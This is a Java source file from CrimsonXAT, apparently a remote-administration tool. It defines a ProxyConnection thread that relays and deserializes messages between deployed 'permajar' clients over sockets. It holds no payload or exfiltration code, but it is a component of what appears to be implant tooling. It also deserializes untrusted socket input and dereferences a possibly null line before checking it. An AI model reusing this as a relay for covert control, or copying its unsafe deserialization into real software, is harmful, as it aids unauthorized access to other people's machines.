/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2;



import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.ObjectTransfer;
import subterranean.crimson.universal.Reporter;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.exceptions.InvalidObjectException;

//connection to another permajar
public class ProxyConnection extends Thread {

	public int clientID;
	private BufferedReader in;
	private PrintWriter out;

	Socket sock;

	public ProxyConnection(Socket s) {
		sock = s;

		try {
			OutputStream os = sock.getOutputStream();
			InputStream is = sock.getInputStream();

			out = new PrintWriter(os, true);

			in = new BufferedReader(new InputStreamReader(is));
		} catch (IOException e) {
			Logger.add("Failed to open stream on socket");
			Reporter.report(e);
		}
		if ((in == null) || (out == null)) {
			// bad socket
			Logger.add("Bad Socket");
		}
		// RoutingTable.routes.put(clientID, clientID);
	}

	@Override
	public void run() {

		while (!Thread.currentThread().isInterrupted()) {
			String ingress = null;
			try {
				ingress = in.readLine();
			} catch (IOException e) {
				// Lost connection
				break;
			}
			Logger.add("(MESSAGE)Message coming in though proxy interface: " + ingress.split("<>")[0] + "<>data");

			if (ingress != null) {
				// check for encryption
				Object res = null;
				try {
					res = ObjectTransfer.fromString(ingress.substring(ingress.indexOf(">") + 1), false);
				} catch (InvalidObjectException e1) {
					// probably another application trying to connect
					// terminate the connection
					Logger.add("Could not deserialize object");
					interrupt();
					return;

				}

				Message r = null;
				if (res instanceof Message) {
					r = (Message) res;
					Logger.add("Got message from a virtually connected PermaJar");
				} else {
					// drop it
					continue;

				}

			}
		}
	}

	public void sendString(String s) {
		Logger.add("(MESSAGE)Message going out through proxy interface: " + s.split("<>")[0] + "<>data");
		out.println(s);

	}

}
